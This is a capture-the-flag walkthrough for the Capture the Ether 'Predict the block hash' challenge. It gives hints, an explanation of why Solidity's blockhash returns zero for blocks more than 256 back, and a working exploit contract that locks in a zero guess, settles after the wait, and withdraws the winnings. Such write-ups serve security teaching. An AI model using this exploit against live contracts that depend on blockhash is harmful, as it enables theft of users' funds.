---
description: >-
  In Capture the Ether's "Predict the block hash", we see an interesting
  business logic flaw that depends on the limitations of a Solidity global
  variable.
---

# Predict the block hash

This [challenge](https://capturetheether.com/challenges/lotteries/predict-the-block-hash/) involves a bit of outside-the-box thinking. We're asked to predict the value of a future block hash, an unknowable value at the time of our guess, and the implementation of the guess/settle logic is (_almost_) foolproof.

### Hints

<details>

<summary>Hint One</summary>

What happens when you try to get the block hash for a non-existent block number in your Solidity contract?

</details>

<details>

<summary>Hint Two</summary>

The solution depends in part on how many block hashes the blockhash function can be used to access. What might this limitation mean in light of the previous hint?

</details>

<details>

<summary>Hint Three</summary>

This solution will require some patience on your part!

</details>

### Full Walkthrough

If the code that handles locking in guesses and settling the transaction truly worked the way it appears at first glance, this challenge would not be possible. The secret to this exploit lies in the fact that Solidity's `blockhash` function will return a value for a non-existent block number, rather than throwing an error. If we call `blockhash` for a block number, for example, in the future, we get `0x0000000000000000000000000000000000000000000000000000000000000000`.&#x20;

Another interesting limitation of the `blockhash` function is that it can only access the last 256 blocks. If it is called for a block number prior to this, it returns the same `0x00...0` response as above.&#x20;

We can exploit this behavior by locking in a guess of `0x00...0` then waiting for enough blocks to settle that when the contract attempts to get the blockhash of `settlementBlockNumber`, which is locked in at the time we make our guess, it will also return `0x00...0`. As Ethereum has an average block time of 15 seconds, we need to wait at least 64 minutes before we can be reasonably sure our trick will work.

### Scripted Solution

```solidity
pragma solidity 0.8.7;

interface IPredictTheBlockHashChallenge {
    function lockInGuess(bytes32 hash) external payable;

    function settle() external;

    function isComplete() external view returns (bool);
}

contract PredictTheBlockHashChallengeExploit {
    IPredictTheBlockHashChallenge private _challengeContract;

    /**
     * Constructor sets `PredictTheBlockHashChallenge` contract.
     */
    constructor(address challengeContractAddress) {
        _challengeContract = IPredictTheBlockHashChallenge(
            challengeContractAddress
        );
    }

    /**
     * Locks in a guess of '0x00...0'.
     */
    function guess() external payable {
        // 0x0000000000000000000000000000000000000000000000000000000000000000
        bytes32 guess = blockhash(block.number - 257);

        // Lock in guess
        _challengeContract.lockInGuess{value: msg.value}(guess);
    }

    /**
     * Settles guess. Call at least 64 minutes after locking in guess.
     */
    function settle() external {
        // Settle
        _challengeContract.settle();

        // Ensure guess was correct
        require(
            _challengeContract.isComplete(),
            "PredictTheBlockHashChallengeExploit: Challenge not complete"
        );

        // Return contract balance to `msg.sender`
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```
